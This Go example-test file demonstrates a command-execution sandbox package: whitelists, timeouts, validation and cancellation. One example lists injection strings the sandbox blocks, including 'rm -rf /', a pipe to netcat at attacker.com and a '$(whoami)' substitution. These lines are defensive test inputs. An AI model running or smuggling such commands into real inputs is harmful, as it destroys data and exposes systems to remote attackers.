//go:build !integration

package sandbox_test

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/QuadDarv1ne/go-pcap2socks/sandbox"
)

// Example_basicUsage demonstrates basic sandbox usage
func Example_basicUsage() {
	// Create executor with default settings
	executor := sandbox.NewExecutor(sandbox.Config{
		MaxExecutionTime: 10 * time.Second,
		MaxMemoryMB:      128,
	})

	// Execute a safe command
	result, err := executor.Execute(
		context.Background(),
		"ping",
		"-n", "1", "127.0.0.1",
	)

	if err != nil {
		log.Printf("Error: %v", err)
		return
	}

	fmt.Printf("Exit code: %d\n", result.ExitCode)
	fmt.Printf("Duration: %v\n", result.Duration)
	// Output will vary by system
}

// Example_customWhitelist demonstrates custom command whitelist
func Example_customWhitelist() {
	config := sandbox.Config{
		MaxExecutionTime: 5 * time.Second,
		AllowedCommands: map[string]bool{
			"ping":    true,
			"ipconfig": true,
		},
	}

	executor := sandbox.NewExecutor(config)

	// This will succeed
	_, err := executor.Execute(context.Background(), "ping", "127.0.0.1")
	if err != nil {
		fmt.Println("Ping failed:", err)
	}

	// This will fail - not in whitelist
	_, err = executor.Execute(context.Background(), "netsh", "interface", "show")
	if err != nil {
		fmt.Println("Netsh blocked:", err)
	}
}

// Example_executeOnStart demonstrates executeOnStart integration
func Example_executeOnStart() {
	config := sandbox.ExecuteOnStartConfig{
		Commands: []string{
			"ipconfig /?",
			"ping -n 1 127.0.0.1",
		},
		Timeout:         30 * time.Second,
		MaxMemoryMB:     128,
		ContinueOnError: true,
	}

	result, err := sandbox.ExecuteOnStart(context.Background(), config)
	if err != nil {
		log.Printf("Error: %v", err)
		return
	}

	fmt.Printf("Success: %d, Failed: %d\n",
		result.SuccessCount, result.FailureCount)
	fmt.Printf("Total duration: %v\n", result.TotalDuration)
}

// Example_validation demonstrates command validation
func Example_validation() {
	commands := []string{
		"ping 127.0.0.1",
		"ipconfig /all",
	}

	allowedCommands := map[string]bool{
		"ping":     true,
		"ipconfig": true,
	}

	// Validate before execution
	err := sandbox.ValidateExecuteOnStartCommands(commands, allowedCommands)
	if err != nil {
		fmt.Println("Validation failed:", err)
		return
	}

	fmt.Println("All commands are valid")
	// Output: All commands are valid
}

// Example_dangerousPatterns demonstrates injection protection
func Example_dangerousPatterns() {
	executor := sandbox.NewExecutor(sandbox.Config{})

	// These will be blocked
	dangerousCommands := []string{
		"ping 8.8.8.8; rm -rf /",
		"ping 8.8.8.8 | nc attacker.com",
		"ping $(whoami)",
	}

	for _, cmd := range dangerousCommands {
		_, err := executor.Execute(context.Background(), "ping", cmd)
		if err != nil {
			fmt.Printf("Blocked: %s\n", cmd)
		}
	}
}

// Example_timeout demonstrates timeout handling
func Example_timeout() {
	// Very short timeout
	executor := sandbox.NewExecutor(sandbox.Config{
		MaxExecutionTime: 100 * time.Millisecond,
	})

	// This will timeout
	result, err := executor.Execute(
		context.Background(),
		"ping",
		"-n", "10", "127.0.0.1",
	)

	if err != nil && result.TimedOut {
		fmt.Println("Command timed out as expected")
	}
}

// Example_errorHandling demonstrates proper error handling
func Example_errorHandling() {
	executor := sandbox.NewExecutor(sandbox.Config{})

	result, err := executor.Execute(
		context.Background(),
		"ping",
		"invalid-host-xyz",
	)

	if err != nil {
		fmt.Printf("Execution error: %v\n", err)
		return
	}

	if result.ExitCode != 0 {
		fmt.Printf("Command failed with exit code: %d\n", result.ExitCode)
		fmt.Printf("Error output: %s\n", result.Stderr)
	}
}

// Example_contextCancellation demonstrates context cancellation
func Example_contextCancellation() {
	executor := sandbox.NewExecutor(sandbox.Config{})

	// Create cancellable context
	ctx, cancel := context.WithCancel(context.Background())

	// Cancel after 1 second
	go func() {
		time.Sleep(1 * time.Second)
		cancel()
	}()

	result, err := executor.Execute(ctx, "ping", "-n", "10", "127.0.0.1")

	if err != nil && ctx.Err() == context.Canceled {
		fmt.Println("Command cancelled by context")
	}

	if result != nil && result.TimedOut {
		fmt.Println("Command timed out")
	}
}

// Example_updateConfig demonstrates dynamic configuration updates
func Example_updateConfig() {
	executor := sandbox.NewExecutor(sandbox.Config{
		MaxExecutionTime: 5 * time.Second,
	})

	// Update configuration
	newConfig := sandbox.Config{
		MaxExecutionTime: 10 * time.Second,
		MaxMemoryMB:      256,
		AllowedCommands: map[string]bool{
			"ping": true,
		},
	}

	executor.UpdateConfig(newConfig)

	// Get current config
	config := executor.GetConfig()
	fmt.Printf("New timeout: %v\n", config.MaxExecutionTime)
	// Output: New timeout: 10s
}
